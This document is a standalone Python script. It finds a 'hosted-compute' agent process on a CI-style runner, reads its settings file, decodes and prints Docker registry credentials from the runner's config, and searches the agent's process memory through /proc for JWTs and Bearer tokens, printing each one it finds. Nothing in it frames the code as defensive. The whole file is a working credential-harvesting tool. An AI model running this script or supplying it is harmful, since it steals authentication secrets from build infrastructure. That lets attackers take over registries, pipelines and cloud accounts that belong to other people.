import os, re, sys, json, base64

pid = None
for p in os.listdir("/proc"):
    if p.isdigit():
        try:
            cmdline = open(f"/proc/{p}/cmdline", "rb").read()
            if b"hosted-compute" in cmdline:
                pid = int(p)
                break
        except: pass

if not pid:
    print("HCA not found")
    sys.exit()

print(f"HCA PID: {pid}")
print(f"HCA user: {os.stat(f'/proc/{pid}').st_uid}")
print(f"My uid: {os.getuid()}")

# Read settings
try:
    settings = json.loads(open("/opt/hca/.settings","rb").read())
    for k,v in settings.items():
        print(f"setting {k}: {v}")
except Exception as e:
    print(f"Settings error: {e}")

# Read docker config
try:
    dc = json.loads(open("/home/runner/.docker/config.json").read())
    for registry, data in dc.get("auths",{}).items():
        auth = data.get("auth","")
        decoded = base64.b64decode(auth).decode()
        print(f"Docker auth {registry}: {decoded}")
except Exception as e:
    print(f"Docker config error: {e}")

# Read memory
try:
    maps = open(f"/proc/{pid}/maps").readlines()
    mem = open(f"/proc/{pid}/mem", "rb")
    found = set()
    for m in maps:
        if "rw-p" not in m: continue
        parts = m.split("-")
        start = int(parts[0], 16)
        end = int(parts[1].split()[0], 16)
        size = end - start
        if size > 50*1024*1024: continue
        try:
            mem.seek(start)
            data = mem.read(size)
            for match in re.finditer(rb"eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.\[A-Za-z0-9_-]{20,}", data):
                t = match.group().decode("ascii",errors="ignore")
                key = t[:40]
                if key not in found:
                    found.add(key)
                    print(f"JWT: {t[:200]}...")
            for match in re.finditer(rb"[Bb]earer\s+([A-Za-z0-9_./-]{30,500})", data):
                t = match.group(1).decode("ascii",errors="ignore")
                key = t[:30]
                if key not in found:
                    found.add(key)
                    print(f"Bearer: {t[:200]}...")
        except: pass
    mem.close()
    print(f"Tokens found: {len(found)}")
except PermissionError:
    print("Cannot read /proc/PID/mem - different user?")
except Exception as e:
    print(f"Memory error: {e}")
